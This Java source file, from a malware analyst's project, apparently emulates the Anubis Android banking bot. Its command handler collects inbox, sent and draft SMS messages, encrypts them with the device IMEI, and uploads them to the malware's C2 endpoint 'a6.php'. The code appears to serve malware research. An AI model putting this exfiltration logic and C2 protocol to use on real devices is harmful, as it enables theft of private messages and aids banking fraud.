/*
 * Copyright (C) 2020 Max 'Libra' Kersten [@Libranalysis, https://maxkersten.nl]
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
package anubis.commands;

import bot.network.Connector;
import anubis.bot.AnubisBot;
import device.SmsMessage;
import java.util.List;

/**
 * Handles the command to get all saves SMS messages from the device
 *
 * @author Max 'Libra' Kersten [@Libranalysis, https://maxkersten.nl]
 */
public class GetSavedSmsMessages {

    /**
     * Uploads all SMS messages from the device to the C2
     *
     * @param bot the bot
     * @throws Exception if a HTTP request fails
     */
    public GetSavedSmsMessages(AnubisBot bot) throws Exception {
        String url = bot.getServer() + "/" + bot.getServerFolder() + "/a6.php";
        Connector connector = bot.getConnector();
        List<SmsMessage> inbox = bot.getPhone().getSmsManager().getInbox();
        List<SmsMessage> drafts = bot.getPhone().getSmsManager().getDrafts();
        List<SmsMessage> outbox = bot.getPhone().getSmsManager().getOutbox();

        String result;
        String parameter;

        if (outbox.size() > 0) {
            result = getSmsFromList(outbox, "sent");
            parameter = "p=" + bot.getEncryptionHandler().encrypt(bot.getPhone().getImei() + "|" + result + "|");
            connector.post(url, parameter);
        }

        if (inbox.size() > 0) {
            result = getSmsFromList(inbox, "inbox");
            parameter = "p=" + bot.getEncryptionHandler().encrypt(bot.getPhone().getImei() + "|" + result + "|");
            connector.post(url, parameter);
        }

        if (drafts.size() > 0) {
            result = getSmsFromList(drafts, "draft");
            parameter = "p=" + bot.getEncryptionHandler().encrypt(bot.getPhone().getImei() + "|" + result + "|");
            connector.post(url, parameter);
        }
    }

    /**
     * Gets all SMS messages from a list, for a given folder, in the format that
     * Anubis requires
     *
     * @param list the list of SMS messages
     * @param folder the folder to use, being "inbox", "sent", or "draft"
     * @return the text messages in the Anubis format
     */
    private String getSmsFromList(List<SmsMessage> list, String folder) {
        String result = "";

        if (folder.equals("inbox")) {
            result = "-----INBOX-----";
        } else if (folder.equals("sent")) {
            result = "-----SENT-----";
        } else if (folder.equals("draft")) {
            result = "-----DRAFT-----";
        }

        for (SmsMessage smsMessage : list) {
            result += "\n" + "Number: (" + smsMessage.getRecipient() + ")" + '\n' + "Text: " + smsMessage.getText();
        }

        return result;
    }
}
